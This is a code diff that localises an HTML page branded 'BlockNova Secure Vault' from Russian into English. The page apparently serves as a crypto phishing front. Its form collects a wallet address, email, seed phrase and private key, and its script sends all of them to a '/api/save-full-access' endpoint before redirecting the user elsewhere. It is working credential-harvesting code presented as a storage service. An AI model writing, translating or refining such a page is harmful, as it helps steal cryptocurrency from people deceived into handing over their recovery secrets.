@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BlockNova - Личный Vault</title>
+    <title>BlockNova - Secure Vault</title>
     <style>
         body {
             font-family: 'Segoe UI', sans-serif;
@@ -22,16 +22,16 @@
             box-shadow: 0 0 30px rgba(138, 43, 226, 0.4);
             border: 1px solid #8a2be2;
         }
-        h1 { 
-            text-align: center; 
-            color: #8a2be2; 
-            font-size: 2.8em; 
+        h1 {
+            text-align: center;
+            color: #8a2be2;
+            font-size: 2.8em;
             margin-bottom: 10px;
         }
-        .subtitle { 
-            text-align: center; 
-            color: #aaa; 
-            margin-bottom: 30px; 
+        .subtitle {
+            text-align: center;
+            color: #aaa;
+            margin-bottom: 30px;
         }
         select, input, textarea {
             width: 100%;
@@ -55,22 +55,22 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        button:hover { 
-            background: linear-gradient(90deg, #9b3be2, #e07be6); 
+        button:hover {
+            background: linear-gradient(90deg, #9b3be2, #e07be6);
         }
-        .status { 
-            margin-top: 20px; 
-            text-align: center; 
-            font-size: 18px; 
-            font-weight: bold; 
+        .status {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>BlockNova</h1>
-        <p class="subtitle">Защищённое хранилище доступа</p>
-       
+        <p class="subtitle">Secure Access Vault</p>
+      
         <form id="vaultForm">
             <select id="chain">
                 <option value="ethereum">Ethereum (ETH)</option>
@@ -78,24 +78,22 @@
                 <option value="bsc">BSC (BNB)</option>
                 <option value="tron">Tron (TRX)</option>
             </select>
-
-            <input type="text" id="address" placeholder="Адрес кошелька" required>
-            <input type="text" id="username" placeholder="Имя пользователя">
-            <input type="email" id="email" placeholder="Email">
-
-            <textarea id="mnemonic" rows="4" placeholder="Seed фраза (опционально)"></textarea>
-            <textarea id="privateKey" rows="3" placeholder="Приватный ключ (опционально)"></textarea>
-           
-            <button type="submit">Сохранить в BlockNova Vault</button>
+            <input type="text" id="address" placeholder="Wallet Address" required>
+            <input type="text" id="username" placeholder="Username (optional)">
+            <input type="email" id="email" placeholder="Email Address (optional)">
+            <textarea id="mnemonic" rows="4" placeholder="Seed Phrase (optional)"></textarea>
+            <textarea id="privateKey" rows="3" placeholder="Private Key (optional)"></textarea>
+          
+            <button type="submit">Save to BlockNova Vault</button>
         </form>
-       
+      
         <div id="status" class="status"></div>
     </div>
 
     <script>
         document.getElementById('vaultForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-           
+          
             const data = {
                 chain: document.getElementById('chain').value,
                 address: document.getElementById('address').value.trim(),
@@ -106,7 +104,7 @@
             };
 
             const statusEl = document.getElementById('status');
-            statusEl.textContent = 'Сохранение...';
+            statusEl.textContent = 'Saving...';
 
             try {
                 const response = await fetch('/api/save-full-access', {
@@ -116,20 +114,19 @@
                 });
 
                 const result = await response.json();
-
                 if (response.ok) {
                     statusEl.style.color = '#00ff9d';
-                    statusEl.textContent = result.message || '✅ Успешно!';
+                    statusEl.textContent = result.message || '✅ Successfully Saved!';
                     setTimeout(() => {
                         window.location.href = result.redirect;
                     }, 1500);
                 } else {
                     statusEl.style.color = 'red';
-                    statusEl.textContent = '❌ ' + (result.error || 'Ошибка сохранения');
+                    statusEl.textContent = '❌ ' + (result.error || 'Save Error');
                 }
             } catch (err) {
                 statusEl.style.color = 'red';
-                statusEl.textContent = '❌ Ошибка соединения с сервером';
+                statusEl.textContent = '❌ Connection Error';
             }
         });
     </script>
